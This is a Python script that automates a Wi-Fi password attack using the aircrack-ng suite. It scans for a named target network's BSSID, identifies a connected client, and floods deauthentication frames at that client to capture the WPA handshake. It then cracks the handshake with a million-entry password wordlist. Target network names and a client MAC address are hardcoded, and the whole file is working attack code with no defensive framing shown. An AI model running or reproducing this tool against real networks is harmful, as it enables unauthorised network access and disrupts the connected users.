import subprocess
from contextlib import redirect_stdout
from monitor import run_command, Monitor
import glob
import threading

def get_bssid(target_name="DuaIat", interface='wlan0', timeout=30):
    command = f"airodump-ng --essid '{target_name}' {interface}"
    print("getting bssid...")

    out = str(run_command(command, capture_output=True, timeout=timeout)).split('BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\x1b[0K\n\x1b[0K')
    out = out[-1]
    print(out.split())
    with open('output', 'w') as f:
        with redirect_stdout(f):
            print(out)

    if out.split()[1]=='BSSID':
        return None
    print(f"target bssid: {out.split()[1]}")
    return out.split()[1]

def get_station(target_bssid, interface='wlan0', timeout=60, filePath='/home/kali/Desktop/nets/test1/'):
    command = f"airodump-ng --bssid '{target_bssid}' {interface} -c 1 -w {filePath}"
    print("getting the mac of a station...")

    out = str(run_command(command, capture_output=True, timeout=timeout)).split('BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\x1b[0K\n\x1b[0K')
    # out = out[-1].strip('\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J')
    out = out[-1]
    # print(out.split())
    with open('output2', 'w') as f:
        with redirect_stdout(f):
            print(out)
    out = out.split()
    out = out[out.index('Notes'): ]
    try:
        bssid_index = out.index(target_bssid)
    except ValueError:
        bssid_index = -1
    if bssid_index == -1:
        print("No station found")
        return None
    print(f"station mac: {out[bssid_index+1]}")
    return out[bssid_index+1]

def give_me_ACK(target, station="F0:09:0D:D5:41:3C", interface="wlan0", tries=30, channel_retry=30) -> None:
    print("getting ACK")
    command = f"aireplay-ng -0 {tries} -a {target} -c {station} {interface}"
    print(command)

    out = run_command(command, capture_output=True)
    # if 'but the AP uses channel' in out and channel_retry:
    #     give_me_ACK(target, station, interface, channel_retry=channel_retry-1)
    # elif ('Invalid destination MAC address' in out or 'No such BSSID available' in out) and channel_retry:
    #     print('Invalid destination MAC address' if 'Invalid destination MAC address' in out else 'No such BSSID available')
    #     Monitor.setup_monitor_mode(interface)
    #     give_me_ACK(target, station, interface, channel_retry=channel_retry-1)

    return None

def crack_password(target, interface="wlan0", passwordSet_path='/home/kali/Desktop/passwords/10-million-password-list-top-1000000.txt', ACK_Path='/home/kali/Desktop/nets/test1/') -> str:
    print("crack password...")
    cap_files = glob.glob(f"{ACK_Path}*.cap")
    if not cap_files:
        print("No .cap files found")
        return None

    # cap_files.sort(key=lambda x: int(x.split('-')[-1].split('.')[0]))
    # latest_cap_file = cap_files[-1]


    command = f"aircrack-ng -a2 -b {target} -w {passwordSet_path} {ACK_Path}*.cap"
    print(command)
    out = run_command(command, capture_output=True, timeout=300)
    print(out)
    with open('passwords', 'w') as f:
        with redirect_stdout(f):
            print(out)
    return out

def main():
    interface = 'wlan0'
    target = 'alEx'
    file_path = "/home/kali/Desktop/nets/test1/"
    passwordSet_path="/home/kali/Desktop/passwords/10-million-password-list-top-1000000.txt"
    Monitor.setup_monitor_mode(interface, test=True)
    
    target_bssid = ""
    for _ in range(5):
        target_bssid = get_bssid(target_name=target)
        if target_bssid:
            break
    if target_bssid:
        station = get_station(target_bssid, filePath=file_path)
        ack_thread = threading.Thread(target=give_me_ACK, args=(target_bssid, station))
        ack_thread.start()
        ack_thread.join()
    else:
        print("No station mac")

    crack_password(target_bssid, passwordSet_path=passwordSet_path, ACK_Path=file_path)
    Monitor.reset_mode(interface)

main()
